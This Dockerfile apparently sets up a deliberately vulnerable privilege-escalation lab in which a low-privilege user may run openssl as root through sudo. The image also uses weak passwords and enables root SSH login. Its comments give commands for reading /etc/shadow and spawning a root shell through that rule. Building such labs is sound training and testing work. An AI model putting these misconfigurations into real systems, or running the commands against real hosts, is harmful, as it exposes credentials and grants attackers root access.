FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_openssl
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/openssl as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and openssl
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        openssl \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify openssl is installed
RUN which openssl && ls -la /usr/bin/openssl

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# openssl can read arbitrary files when run as root via:
#   sudo openssl enc -in /etc/shadow
# It can also spawn a shell via:
#   LFILE=/tmp/exploit && echo '#!/bin/bash' > $LFILE && echo '/bin/bash -i' >> $LFILE && chmod +x $LFILE && sudo openssl req -engine $LFILE
# Or more directly, openssl has a built-in s_client/enc that can read files,
# and combined with writing capabilities can overwrite /etc/passwd.
# The key exploit: sudo openssl enc -in /etc/shadow (read sensitive files)
# For shell: use openssl to read/write /etc/passwd to add a root user,
# or leverage the openssl req -x509 with -engine or use the openssl's
# ability to execute commands.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/openssl" > /etc/sudoers.d/openssl && \
    chmod 440 /etc/sudoers.d/openssl

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]